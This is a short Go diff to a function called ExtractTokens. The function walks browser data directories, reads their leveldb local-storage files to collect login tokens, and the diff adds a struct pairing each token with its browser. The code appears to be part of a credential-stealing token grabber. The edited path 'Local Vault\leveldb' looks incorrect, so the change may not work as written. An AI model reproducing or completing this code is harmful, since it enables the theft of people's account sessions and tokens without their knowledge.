@@ -7,6 +7,11 @@ import (
 	"sync"
 )
 
+type TOKEN struct {
+	browser string
+	token   string
+}
+
 func ExtractTokens() []string {
 
 	var WG sync.WaitGroup
@@ -17,7 +22,7 @@ func ExtractTokens() []string {
 			continue
 		}
 
-		var PLATFORM_PATH string = Path.DataFiles + "\\Local Storage\\leveldb\\"
+		var PLATFORM_PATH string = Path.DataFiles + "\\Local Vault\\leveldb\\"
 
 		items, _ := os.ReadDir(PLATFORM_PATH)
 		for _, File := range items {
